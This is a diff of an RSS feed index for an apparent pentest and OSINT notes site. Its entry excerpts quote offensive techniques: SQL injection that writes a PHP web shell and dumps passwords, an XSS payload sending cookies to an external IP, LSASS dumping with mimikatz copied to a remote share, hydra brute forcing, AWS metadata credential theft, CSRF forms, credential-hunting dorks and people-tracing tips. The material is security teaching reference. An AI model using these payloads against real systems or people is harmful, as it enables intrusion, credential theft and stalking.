@@ -12,22 +12,22 @@
     
     <item>
       <title>21 - FTP</title>
-      <link>/recon-enumeration/services-enumeration/21_ftp/</link>
+      <link>/network/services-enumeration/21_ftp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/21_ftp/</guid>
+      <guid>/network/services-enumeration/21_ftp/</guid>
       <description>Identification # Base connection ftp &amp;lt;IP&amp;gt; &amp;gt; USER Anonymous &amp;gt; PASS test # It can be usefull to try passive mode ftp -p &amp;lt;IP&amp;gt; &amp;gt; USER Anonymous &amp;gt; PASS test # Using telnet telnet &amp;lt;IP&amp;gt; 21 Anonymous test bin (binary mode, don\&amp;#39;t forget it before transfering exe file) get / send # FTP Web Access ? # Try upload and execute through web access ftp://IP 
 Bruteforce hydra -L users.</description>
     </item>
     
     <item>
-      <title>Admin and Processes</title>
-      <link>/windows-systems/privilege-escalation/admin_processes/</link>
+      <title>Automated Recon</title>
+      <link>/windows-systems/privilege-escalation/automated_recon/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/windows-systems/privilege-escalation/admin_processes/</guid>
-      <description>Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results 
-Sessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.</description>
+      <guid>/windows-systems/privilege-escalation/automated_recon/</guid>
+      <description>Binaries Information https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe 
+Local Exploit Suggester # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt # Metasploit also has a module &amp;gt; use post/multi/recon/local_exploit_suggester msf5 post(multi/recon/local_exploit_suggester) &amp;gt; options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf5 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 1 SESSION =&amp;gt; 1 msf5 post(multi/recon/local_exploit_suggester) &amp;gt; run [*] 10.</description>
     </item>
     
     <item>
@@ -41,12 +41,15 @@ Symbolic link attack # base program int main(void) { system(&amp;#34;ls /path/to
     </item>
     
     <item>
-      <title>Domain &amp; IP</title>
-      <link>/open-source-intelligence-osint/technical-recon/domain_ip/</link>
+      <title>Content Discovery</title>
+      <link>/web-pentest/resources-discovery/content_discovery/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/domain_ip/</guid>
-      <description>Identification Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com # Get IP address associated to a domain nslookup domain.fr ping domain.fr # Bing dorks to identify host sharing ip:xxx.xxx.xxx.xxx # Reverse DNS Resolution (also usefull for subdomains) for x in {1..255}; do host xx.xx.xx.$x; done # Knockknock is a small automated script allowing you to find domaine names # For a registrant (person or company) python3 k2.</description>
+      <guid>/web-pentest/resources-discovery/content_discovery/</guid>
+      <description>Resources # Fuzzing Wordlists https://github.com/fuzzdb-project/fuzzdb # Fuzzing and Content Discovery https://github.com/kaimi-io/web-fuzz-wordlists 
+Tips # Fuzz non-printable characters in any user input # Could result in regex bypass, account takeover... 0x00, 0x2F, 0x3A, 0x40, 0x5B, 0x60, 0x7B, 0xFF %00, %2F, %3A, %40, %5B, %60, %7B, %FF 
+JS extraction # Extract endpoint from JS files (https://github.com/jobertabma/relative-url-extractor) ruby extract.rb https://hackerone.com/some-file.js 
+Broken Links # Check for broken links and domain takeover # For twitter, TwitterBFTD is great https://github.</description>
     </item>
     
     <item>
@@ -65,20 +68,7 @@ Symbolic link attack # base program int main(void) { system(&amp;#34;ls /path/to
       
       <guid>/windows-systems/exploitation/exploitation_tricks/</guid>
       <description>Obfuscation # There are many ways you can use to obfuscate conten # PyFuscation (https://github.com/CBHue/PyFuscation) bring small usefull features $ python3 PyFuscation.py -fvp --ps ./Scripts/Invoke-Mimikatz.ps1  
-Dumping LSASS # If you are SYSTEM and need creds, you can dump lsass.exe and then use Mimikatz in local procdump.exe -ma lsass.exe lsadump.dmp copy lsadump.dmp \\IP\yourshare\lsadump.dmp # Then mimikatz... privilege::debug sekurlsa::minidump lsadump.dmp sekurlsa:logonPasswords /full# You can also remotely dump lsass and then process it locally # Method 1 # Open a SMB Server, drop mimikatz or procdump and get your output back to your SMB Server # Method 2 # https://github.</description>
-    </item>
-    
-    <item>
-      <title>Firefox addons</title>
-      <link>/open-source-intelligence-osint/general/firefox_addons/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/general/firefox_addons/</guid>
-      <description>OSINT Bookmarks https://www.osintcombine.com/osint-bookmarks 
-Flag Fox Flagfox is an extension that displays a flag icon indicating the current webserver&amp;rsquo;s physical location.
-It then launch a geotool webpage to get more informations about the website you are visiting About IP &amp;amp; Domain.
-Google Cache Google Cache lets you visit retrieve the web page from Google Web Cache when the site is offline.
-If the site is offline, you can just press toolbar button and request cached version of the page from Google Cache.</description>
+Using Powershell AD Module without RSAT # The secret to being able to run AD enumeration commands from the AD Powershell # is the DLL located in C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management # You can just grab it on a system with RSAT and drop it on the target Import-Module .</description>
     </item>
     
     <item>
@@ -91,13 +81,30 @@ If the site is offline, you can just press toolbar button and request cached ver
     </item>
     
     <item>
-      <title>Github</title>
-      <link>/open-source-intelligence-osint/hosting-and-repositories/github/</link>
+      <title>General Infosec</title>
+      <link>/resources/general_infosec/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/hosting-and-repositories/github/</guid>
-      <description>General # Online Service used to search in many git repositories https://grep.app/ 
-Finding user e-mail # Method 1 # Go for it → https://api.github.com/users/xxxxxxx/events/public # And search for “email” ------------------------ # Method 2 # Go for user repositories # Find one repo and go checks commits # Take one commit https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2 # Add .patch at the end and check for email https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2.patch# Usually, credential leaks do not occur on the company public Github # But more on developer/employees personal Github</description>
+      <guid>/resources/general_infosec/</guid>
+      <description>Training Resources  HackTheBox video WU (https://ippsec.rocks/#) Resources, cheatsheets etc about EVERYTHING (https://github.com/trimstray/the-book-of-secret-knowledge)  Network &amp;amp; Pentest  Network Pivoting (https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/) Remote Access Cheatsheet (https://dolosgroup.io/blog/remote-access-cheat-sheet) Many Reverse Shells (https://alamot.github.io/reverse_shells/)  Passcracking, Worlists &amp;amp; Passwords  Kaonashi worlists and rules (https://github.com/kaonashi-passwords/Kaonashi) One rule to rule them all (https://www.notsosecure.com/one-rule-to-rule-them-all/) Common French Passwords (https://github.com/tarraschk/richelieu) Rockyou (https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) Passwords Wordlists (https://weakpass.com/) Several Wordlists types (https://github.com/berzerk0/Probable-Wordlists) Language Dictionnaries (https://packetstormsecurity.com/Crackers/wordlists/page4/) Language Dictionnaries (http://www.gwicks.net/dictionaries.htm) SCADA default passwords (http://www.</description>
+    </item>
+    
+    <item>
+      <title>Google</title>
+      <link>/open-source-intelligence-osint/platforms-hunting/google/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/platforms-hunting/google/</guid>
+      <description>Get UserIDs Google Drive Documents # Get user ID from Google Drive document # Logged # Open the source code and search for: &amp;#34;\x2210&amp;#34; and &amp;#34;\x2211&amp;#34; # Paste it in the Google Photos or Maps URL and find out more about your target. # Not logged in # Developer tools &amp;gt; Network &amp;gt; Filter &amp;#34;Permissions&amp;#34; # Load the document and get informations for owner &amp;amp; co Google Contacts # Google Contacts can help getting IDs from e-mails # But it may not work !</description>
+    </item>
+    
+    <item>
+      <title>Google Dorks</title>
+      <link>/open-source-intelligence-osint/dorks/google_dorks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/dorks/google_dorks/</guid>
+      <description>Google Dorks # Google Hacking made easy https://pentest-tools.com/information-gathering/google-hacking# # Search for documents on popular clouds site:drive.google.com &amp;lt;searchterm&amp;gt; site:dl.dropbox.com &amp;lt;searchterm&amp;gt; site:s3.amazonaws.com &amp;lt;searchterm&amp;gt; site:onedrive.live.com &amp;lt;searchterm&amp;gt; site:cryptome.org &amp;lt;searchterm&amp;gt; # Admins credentials intext:company_keyword &amp;amp; ext:txt | ext:sql | ext:cnf | ext:config | ext:log &amp;amp; intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;administrator&amp;#34; &amp;amp; intext:&amp;#34;password&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;administrator&amp;#34; # Look for domains indexed by others website site:bgp.he.net inurl:ndd site:dnslookup.fr inurl:ndd # Get information on the internal organization sites:cadres.</description>
     </item>
     
     <item>
@@ -111,6 +118,15 @@ Attack modes -a 0 # Straight : hash dict -a 1 # Combination : hash dict dict -a 
     </item>
     
     <item>
+      <title>IP Address</title>
+      <link>/open-source-intelligence-osint/technical-recon/ip_address/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/ip_address/</guid>
+      <description>Getting Informations Whois and ASN # Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com# Get ASN for your target bgp.he.net# You can identify IP block owned by a company ipv4info.com Online Scanners # Shodan.io and Censys.io are also usefull # Keywords on Shodan https://beta.shodan.io/search/filters city:&amp;#34;Grenoble&amp;#34; country:&amp;#34;FR&amp;#34; geo:&amp;#34;21.452673,56.245212&amp;#34; server: &amp;#34;gws&amp;#34; hostname:&amp;#34;google&amp;#34; net:210.214.0.0/16 os:&amp;#34;windows 10&amp;#34; port:22 # https://github.com/jakejarvis/awesome-shodan-queries# Get information about the target IP https://www.onyphe.io/ # Robtex is a great and complete tool https://www.</description>
+    </item>
+    
+    <item>
       <title>IPBX</title>
       <link>/other-systems/ipbx/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -120,13 +136,12 @@ Attack modes -a 0 # Straight : hash dict -a 1 # Combination : hash dict dict -a 
     </item>
     
     <item>
-      <title>LinkedIn</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/linkedin/</link>
+      <title>Information Gathering</title>
+      <link>/open-source-intelligence-osint/company_investigations/company_informations/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/linkedin/</guid>
-      <description># Check the &amp;#34;see coordinates&amp;#34; on accounts # Sometimes, people link other resources 
-ScrapedIn # Tool created to assist in performing recon using the LinkedIn API. # Provide a search string # Ouput as XLSX but intented to work with Google Sheets # After importing you&amp;#39;ll have a dataset and report worksheet # Dataset : First name, last name, occupation, industry, profile URL, picture URL # Report : Picture (displayed), Full name, occupation, Link to profile # Full size profile photo # Then right click &amp;#34;view image&amp;#34; https://linkedin.</description>
+      <guid>/open-source-intelligence-osint/company_investigations/company_informations/</guid>
+      <description>Company Informations General # Find informations about a company https://opencorporates.com # Giant database project containing many informations https://aleph.occrp.org/ Financial &amp;amp; Administrative # Legal and Financial informations (might not be free for full informations) https://www.societe.com/ https://www.infogreffe.fr/ https://www.crunchbase.com https://fr.kompass.com/ Technical &amp;amp; Hosted # Find multiples sites owned by the same individual/company http://www.spyonweb.com # Look for reported vulnerabilities https://www.openbugbounty.org/ Jobs # Jobs https://www.glassdoor.fr/index.htm # Find people based on several websites https://recruitin.net/ Business # Call for tender → BOAMP https://www.</description>
     </item>
     
     <item>
@@ -135,16 +150,27 @@ ScrapedIn # Tool created to assist in performing recon using the LinkedIn API. #
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/local-and-physical/local_recon_enumeration/</guid>
-      <description>Basics whoami whoami /priv ipconfig type “C:\Documents and Settings\Administrator\Desktop\proof.txt” # Powershell whoami $env:UserName echo %username% echo %path% ipconfig /all netstat -ano # Display hidden files dir /a # Recursive dir dir /s # Available ? Ok drop jaws enum tool ! powershell “$var=1” # Possible ? Ok drop windowsprivcheck.py &amp;#34;C:\Python2X\python.exe&amp;#34; -c &amp;#34;print &amp;#39;1&amp;#39;&amp;#34; # If x86 ? Drop windows-privesc-check.exe # You can use WinPrivCheck.bat to check common misconfigurations and KB https://github.</description>
+      <description>Tips # Powershell whoami $env:UserName # Display hidden files dir /a # Recursive dir dir /s # If you can&amp;#39;t browse a folder because of space char # You can use an old trick cmd&amp;gt; cd progra~1 
+Enumeration - Host Information # Exact OS version type C:/Windows/system32/eula.txt type C:\Windows\System32\drivers\etc\hosts# OS Arch systeminfo wmic qfe # Envionment variables ? DC on the logon server ? set powershell&amp;gt; Get-ChildItem Env: | ft Key,Value # Other connecte drives ?</description>
     </item>
     
     <item>
       <title>Masscan Cheatsheet</title>
-      <link>/recon-enumeration/port-scanning/masscan_cheatsheet/</link>
+      <link>/network/port-scanning/masscan_cheatsheet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/port-scanning/masscan_cheatsheet/</guid>
+      <guid>/network/port-scanning/masscan_cheatsheet/</guid>
       <description>Usage and Options Target speficication # Target specification masscan 10.0.0.1 masscan 10.0.0.0/24 192.168.1.0/24 # Exclude IP file masscan 10.0.0.1/24 --excludeFile &amp;lt;file&amp;gt; # Exclude a single IP from the scan masscan 180.215.0.0/16 --exclude=180.215.122.120 Port specification # Port specification masscan 10.0.0.0.1 -p 80 masscan 10.0.0.0.1 -p 0-65535 masscan 10.0.0.0.1 -p 80,443 # UDP Scan masscan 10.0.0.0.1 -pU 53 Timing and Performance # Used to scan in offline mode # It does not send any traffic but just estimate the time length masscan 0.</description>
+    </item>
+    
+    <item>
+      <title>Methodology</title>
+      <link>/open-source-intelligence-osint/tools-and-methodology/methodology/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/tools-and-methodology/methodology/</guid>
+      <description>Sources : https://www.dfir.training/osint
+Gap Analysis &amp;amp; others # In OSINT - Analytical mind # Ask a lot of questions : Who, What, When, Where, Why, and How # Be Curious and Craft a Storyline # Use Gap Analysis shttps://nixintel.info/osint/using-gap-analysis-to-keep-osint-investigations-on-track/ 1. What do we know ? 2. What does the information mean? 3. What do I still need to know? 4. How do I find out? # Reflect on failures but also wins 1.</description>
     </item>
     
     <item>
@@ -180,10 +206,10 @@ LLMNR / NBT-NS # You can Man in The Middle using LLMNR and NBT-NS if they&amp;#3
     
     <item>
       <title>PHP Filters</title>
-      <link>/web-attacks/php-vulnerabilities/php_filters/</link>
+      <link>/web-pentest/php-vulnerabilities/php_filters/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/php-vulnerabilities/php_filters/</guid>
+      <guid>/web-pentest/php-vulnerabilities/php_filters/</guid>
       <description>PHP Filters # Base64 ?inc=php://filter/read=convert.base64-encode/resource=config.php# iconv conversion filter can be used (https://gynvael.coldwind.pl/?lang=en&amp;amp;id=671) # allows you to use iconv to convert all processed data from charset A to charset B # where both character sets can be chosen from a surprisingly long list of supported encodings iconv -l # Example &amp;lt;?php $url = &amp;#34;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&amp;lt;&amp;gt;text&amp;#34;; echo file_get_contents($url); // Output: // some+ADwAPg-text # Then you can use it to change the charset of your payload php://filter/convert.</description>
     </item>
     
@@ -229,22 +255,32 @@ Basics hostname whoami id ifconfig uname -a uname -m # Check version using searc
     
     <item>
       <title>Recon-ng</title>
-      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/recon-ng/</link>
+      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recon-ng/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/recon-ng/</guid>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recon-ng/</guid>
       <description>General Informations https://bitbucket.org/LaNMaSteR53/recon-ng/wiki/Usage%20Guide # Its possible to add your own modules # Reconnaissance → Usage of open sources (passive) # Discovery → More active, packets sent to target # After loading a module, the context of the framework changes, and a new set of commands and options are available. # These commands and options are unique to the module. (help / show) 
 Usage # Add API keys &amp;gt; keys add shodan_api &amp;lt;key&amp;gt; &amp;gt; keys list # Modules &amp;gt; show modules &amp;gt; search &amp;lt;string&amp;gt; &amp;gt; use recon/domains-hosts/builtwith &amp;gt; show infos &amp;gt; set &amp;lt;param&amp;gt; &amp;lt;value&amp;gt; # Workspaces &amp;gt; show workspaces &amp;gt; workspaces list &amp;gt; workspaces add Name &amp;gt; workspaces select &amp;lt;ws&amp;gt; # Add companies and domains to a schema &amp;gt; show schema &amp;gt; add compagnies company &amp;gt; add domains domain.</description>
     </item>
     
     <item>
       <title>SQL Injections</title>
-      <link>/web-attacks/server-side-injections/sql/</link>
+      <link>/web-pentest/injections/server-side-injections/sql/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/server-side-injections/sql/</guid>
+      <guid>/web-pentest/injections/server-side-injections/sql/</guid>
       <description>Resources https://websec.wordpress.com/tag/sql-filter-bypass/ # Cheat sheet https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md  
 General and Tricks # Classical test &#39; or 1=1 LIMIT 1 -- &#39; or 1=1 LIMIT 1 -- - &#39; or 1=1 LIMIT 1# &#39;or 1# &#39; or 1=1 -- &#39; or 1=1 -- - admin\&#39;-- -  # Upload file union all select 1,2,3,4,&amp;quot;&amp;lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&amp;gt;&amp;quot;,6 into OUTFILE &#39;c:/inetpub/wwwroot/backdoor.php&#39;  # Passwords uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password),6 FroM users uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password,0x3a,flag),6 FroM users  # Dump In One Shot (Shoot): \&#39; unIOn seLEct 1,make_set(6,@:=0x0a,(selEct(1)froM(information_schema.</description>
+    </item>
+    
+    <item>
+      <title>Searching Someone</title>
+      <link>/open-source-intelligence-osint/human-recon/searchingsomeone/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/searchingsomeone/</guid>
+      <description>Resources # GREAT resources containing different graphs and processes # to investigate based on what you have https://medium.com/@Peter_UXer/osint-how-to-find-information-on-anyone-5029a3c7fd56 https://medium.com/week-in-osint/getting-a-grasp-on-googleids-77a8ab707e43 https://www.aware-online.com/en 
+Searching People # Very good and accurate tool # You can search by name, reverse phone or reverse address https://www.truepeoplesearch.com/ # Good search engine, different kinds of data https://webmii.com/ # Kinda amazing resource # Finding company related data about a person https://aleph.occrp.org # Dead people registry (EU) https://deces.matchid.io# 118218 for France is very good # Reverse dict https://www.</description>
     </item>
     
     <item>
@@ -258,11 +294,20 @@ Recon and Enumeration # Look for strange process ps aux # Look for setuid progra
     </item>
     
     <item>
-      <title>Web Application Scans</title>
-      <link>/recon-enumeration/application-scans/web_application_scan/</link>
+      <title>URL Shortener</title>
+      <link>/open-source-intelligence-osint/technical-recon/misc/url_shortener/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/application-scans/web_application_scan/</guid>
+      <guid>/open-source-intelligence-osint/technical-recon/misc/url_shortener/</guid>
+      <description>Short URL &amp;amp; Redirections # Get informations about a shortened link https://checkshorturl.com # Find where does redirection go http://redirectdetective.com/ # Get information directly from the creator (bitly for example # Add + at the the end (you can get creation date) https://bit.ly/3b7QP9M https://bit.ly/3b7QP9M+</description>
+    </item>
+    
+    <item>
+      <title>Web Application Scans</title>
+      <link>/web-pentest/applicative-scans/web_application_scan/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-pentest/applicative-scans/web_application_scan/</guid>
       <description>API Endpoints wordlist https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d  Nikto # For web applications, you can use nikto to identify potential vulnerabilities # Not very stealth # Think about changing the default user agent ! nitko -h http://monsite.com -o output.xml -Format [csv, xml, html, txt] 
 Whatweb # Whatweb is another scanning tool for web applications $ whatweb -h $ whatweb -l # Liste les plugins $ whatweb www.monsite.com $ whatweb www.monsite.com -v $ whatweb www.</description>
     </item>
@@ -279,19 +324,19 @@ Monitoring, Recon and Dumping # Using the aircrack-ng suite # Turning on the mon
     
     <item>
       <title>Wordpress</title>
-      <link>/web-attacks/content-management-system-cms/wordpress/</link>
+      <link>/web-pentest/content-management-system-cms/wordpress/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/content-management-system-cms/wordpress/</guid>
+      <guid>/web-pentest/content-management-system-cms/wordpress/</guid>
       <description>General &amp;amp; Tricks # Username can be guessed on WordPress since the username will generate a different error message if it doesn&amp;#39;t exist. # Interesting files https://monsite.com/robots.txt https://monsite.com/feed https://monsite.com/readme.html https://monsite.com/xmlrpc.php # Configuration files https://monsite.com/.htaccess https://monsite.com/wp-config.php # Directory listing https://monsite.com/wp-includes # XML-RPC attack (https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit) # You can bruteforce users ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1 # If by any way you can upload files, go check /upload or /uploads for your files # Get WPEngine&amp;#39;s config file /_wpeprivate/config.</description>
     </item>
     
     <item>
       <title>XSS Injections</title>
-      <link>/web-attacks/client-side-injections/xss/</link>
+      <link>/web-pentest/injections/client-side-injections/xss/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/client-side-injections/xss/</guid>
+      <guid>/web-pentest/injections/client-side-injections/xss/</guid>
       <description>Resources https://html5sec.org/ https://gbhackers.com/top-500-important-xss-cheat-sheet/ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot https://github.com/s0md3v/AwesomeXSS/ 
 Tips # If XSS is not executed through the UI, you can try to insert it through the API # It can then fire on the UI. Many filters are not present like this 
 Basic Stored XSS # Setup simple server python -m SimpleHTTPServer 8080 # Test wget -O- http://$(wget -qO- icanhazip.com):8080/lol # Exploit &amp;lt;script&amp;gt;document.location(&amp;#39;http://IP_EXTERNE/&amp;#39;+document.cookie)&amp;lt;/script&amp;gt; 
@@ -300,10 +345,10 @@ Payloads # Document.location &amp;lt;script&amp;gt;document.location(&#39;http:/
     
     <item>
       <title>22 - SSH</title>
-      <link>/recon-enumeration/services-enumeration/22_ssh/</link>
+      <link>/network/services-enumeration/22_ssh/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/22_ssh/</guid>
+      <guid>/network/services-enumeration/22_ssh/</guid>
       <description> Recon # Banner grabbing using telnet telnet IP 22 
 Bruteforce # List of users using wordlists hydra -L users.txt -P &amp;lt;passwordList&amp;gt; -t 3 -s port &amp;lt;IP&amp;gt; ssh # Only one user and wordlist passwords hydra -l root -P &amp;lt;passwordList&amp;gt; -t 3 -s port &amp;lt;IP&amp;gt; ssh 
 OpenSSL # Connection through openssl openssl s_client -connect IP:PORT</description>
@@ -331,32 +376,31 @@ Exploiting sudo    Binary program Commands Infos     apache2 sudo apache2 -f /et
     </item>
     
     <item>
-      <title>Amazon &amp; Digital Ocean Buckets</title>
-      <link>/open-source-intelligence-osint/hosting-and-repositories/amazon_digitalocean/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/hosting-and-repositories/amazon_digitalocean/</guid>
-      <description>Look for static content in HTML, you can find content hosted on s3 bucket for example and then exploit it  
-AWS Bucket access (SSRF for example) # You can get informations and secret about an S3 bucket # Credentials, main goal http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ # You might need the zone http://169.254.169.254/latest/dynamic/instance-identity/document # Then set # AWS_ACCESS_KEY_ID # AWS_SECRET_ACCESS_KEY # AWS_DEFAULT_REGION # AWS_SESSION_TOKEN 
-Amazon S3 (AWS) Buckets # Tools like AWSBucketDump can enumerate AWS S3 buckets https://github.</description>
-    </item>
-    
-    <item>
       <title>Aquatone</title>
-      <link>/recon-enumeration/application-scans/aquatone/</link>
+      <link>/web-pentest/applicative-scans/aquatone/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/application-scans/aquatone/</guid>
+      <guid>/web-pentest/applicative-scans/aquatone/</guid>
       <description>Aquatone # Aquatone is a complete tool separate in three commands to make complete recon # Collector modules : # Dictionary brute force # DNSDB.org # Google Transparency Report # HackerTarget # Netcraft # Shodan (API key needed) # ThreatCrowd # VirusTotal (API key needed) # PHASE 1 : Discovery # aquatone-discover is the first step # It uses name servers and performs some test to see if wildcard is configured # Then it asks each subdomain collector for potential subdomain # Then it tries to resolve them to see which ones are up and creates the hosts.</description>
     </item>
     
     <item>
       <title>CSRF Injections</title>
-      <link>/web-attacks/client-side-injections/csrf/</link>
+      <link>/web-pentest/injections/client-side-injections/csrf/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/client-side-injections/csrf/</guid>
+      <guid>/web-pentest/injections/client-side-injections/csrf/</guid>
       <description>Basic CSRF 0 protection # Basic form &amp;lt;form name=&amp;#34;pls&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt; &amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Username:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;username&amp;#34; value=&amp;#34;devsid&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt;	&amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Status:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;status&amp;#34;checked=&amp;#34;checked&amp;#34; type=&amp;#34;checkbox&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt;	&amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script language=&amp;#34;javascript&amp;#34;&amp;gt;document.pls.submit();&amp;lt;/script&amp;gt;# Basic form &amp;lt;html&amp;gt;&amp;lt;body&amp;gt; &amp;lt;form name=&amp;#34;csrf&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;aaa&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;status&amp;#34; value=&amp;#34;on&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt;document.csrf.submit();&amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;# Form using XMLHttpRequest &amp;lt;script&amp;gt; var formData = new FormData(); formData.append(&amp;#34;username&amp;#34;, &amp;#34;test&amp;#34;); formData.append(&amp;#34;status&amp;#34;, &amp;#34;on&amp;#34;); var request = new XMLHttpRequest(); request.</description>
+    </item>
+    
+    <item>
+      <title>Domain &amp; URLs</title>
+      <link>/open-source-intelligence-osint/technical-recon/domains_urls/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/domains_urls/</guid>
+      <description>Getting Informations Get information on an IP whois &amp;lt;IP&amp;gt; # Get IP address associated to a domain nslookup domain.fr ping domain.fr # Knockknock is a small automated script allowing you to find domain names # For a registrant (person or company) python3 k2.py -n company -d # Many tools https://intelx.io/ 
+Online Passive Identification Tools Target Mapping and Informations # Informations about the target https://securitytrails.com/ # Robtex is a great and complete tool https://www.</description>
     </item>
     
     <item>
@@ -366,16 +410,16 @@ Amazon S3 (AWS) Buckets # Tools like AWSBucketDump can enumerate AWS S3 buckets 
       
       <guid>/windows-systems/network-and-domain-recon/domain_recon/</guid>
       <description>Tips # Enumerate sessions net session \\computer 
